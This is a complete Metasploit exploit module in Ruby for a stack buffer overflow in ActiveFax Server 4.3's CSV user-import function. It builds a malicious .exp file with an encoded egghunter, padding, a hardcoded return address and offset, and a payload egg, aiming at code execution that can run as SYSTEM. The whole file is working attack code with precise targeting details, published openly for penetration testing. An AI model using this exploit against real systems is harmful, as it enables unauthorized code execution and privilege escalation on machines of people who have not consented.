# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ActiveFax (ActFax) 4.3 Client Importer Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in ActiveFax Server. The vulnerability is
        a stack based buffer overflow in the "Import Users from File" function, due to the
        insecure usage of strcpy while parsing the csv formatted file. The module creates a
        .exp file that must be imported with ActiveFax Server. The module has been tested
        successfully on ActFax Server 4.32 over Windows XP SP3 and Windows 7 SP1. In the
        Windows XP case, when ActFax runs as a service, it will execute as SYSTEM.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Craig Freyman&#039;, # Vulnerability discovery and PoC
          &#039;Brandon Perry&#039;, # Metasploit module
          &#039;juan vazquez&#039;   # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;20915&#039; ],
          [ &#039;URL&#039;, &#039;http://www.pwnag3.com/2012/08/actfax-local-privilege-escalation.html&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;process&#039;,
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 4000,
          &#039;BadChars&#039; => "",
          &#039;DisableNops&#039; => true,
        },

      &#039;Targets&#039;        =>
        [
          [ &#039;ActFax 4.32 / Windows XP SP3 EN / Windows 7 SP1&#039;,
            {
              &#039;Ret&#039;    => 0x00401b22, # ret from ActFax.exe]
              &#039;Offset&#039;  => 512
            }
          ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Aug 28 2012&#039;,
      &#039;DefaultTarget&#039;   => 0))

    register_options([OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.exp&#039;]),], self.class)

  end

  def exploit

    #These badchars do not apply to the final payload
    badchars = (0x00..0x20).to_a.pack("C*") + "\x7c"

    eggoptions =
      {
        :checksum => true,
        :eggtag => &#039;w00t&#039;
      }

    hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)

    [ &#039;x86/alpha_upper&#039;].each { |name|
      enc = framework.encoders.create(name)
      if name =~/alpha/
        enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;ESP&#039; })
      end
      hunter = enc.encode(hunter, nil, nil, platform)
    }

    buffer = "\x83\xC4\x7f" * 19 # add esp, byte 0xff
    buffer << "\x83\xC4\x23" # add esp, byte 0x23
    buffer << hunter
    buffer << rand_text(target[&#039;Offset&#039;] - buffer.length, badchars)
    buffer << [target.ret].pack("V")
    buffer << egg

    file =  "User Name\tEntire User Name\tPassword\tAlias-Names\tGroup\tDirect Dialing\tCost Account\tPermissions\tComments\tUser-Defined\t"
    file << "Predefined Settings\tName 1\tName 2\tName 3\tName 4\tName 5\tDepartment\tAttention of\tPhone 1\tPhone 2\tFax Number\tE-Mail\t"
    file << "Coverpage Non-Windows\tOverlay Non-Windows\tCoverpage Windows\tOverlay Windows\tUser-Defined\tPrinter Settings\tAutomatic Printing Outgoing\t"
    file << "Printer Name Outgoing\tReport Outgoing\tAutomatic Printing Incoming\tPrinter Name Incoming\tReport Incoming\tNotification Outgoing\t"
    file << "Email Outgoing\tNotification Incoming\tEmail Incoming\tAttach Original Message\tUser-Defined Archive Settings\tExport Outgoing\t"
    file << "Export Incoming\tExport-Path\tMark as Read\r\n"
    file << buffer
    file << "\r\n"

    file_create(file)

  end
end



